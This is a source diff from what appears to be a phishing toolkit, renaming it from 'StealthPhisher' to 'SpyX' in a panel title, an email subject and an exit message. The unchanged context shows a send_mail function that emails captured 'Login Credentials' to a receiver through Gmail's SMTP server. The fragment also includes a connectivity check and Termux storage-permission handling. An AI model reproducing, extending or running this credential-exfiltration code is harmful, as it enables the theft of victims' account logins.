@@ -435,7 +435,7 @@ def show_file_data(file):
     cprint(
         Panel(
             text.strip(),
-            title="[bold green]StealthPhisher[/][cyan] Data[/]", 
+            title="[bold green]SpyX[/][cyan] Data[/]", 
             title_align="left",
             border_style="blue",
         )
@@ -647,7 +647,7 @@ def internet(url="https://api.github.com", timeout=5):
 # Send mail by smtp library
 def send_mail(msg):
     global email, password, receiver
-    message = f"From: {email}\nTo: {receiver}\nSubject: StealthPhisher Login Credentials\n\n{msg}"
+    message = f"From: {email}\nTo: {receiver}\nSubject: SpyX Login Credentials\n\n{msg}"
     try:
         internet()
         with smtp('smtp.gmail.com', 465) as server:
@@ -1107,7 +1107,7 @@ def requirements():
         except Exception as e:
             print(f"{error}{str(e)}")
         if termux and retry == 1:
-            print(f"\n{error}You haven't allowed storage permission for termux. Closing StealthPhisher\n")
+            print(f"\n{error}You haven't allowed storage permission for termux. Closing SpyX\n")
             sleep(2)
             pexit()
 
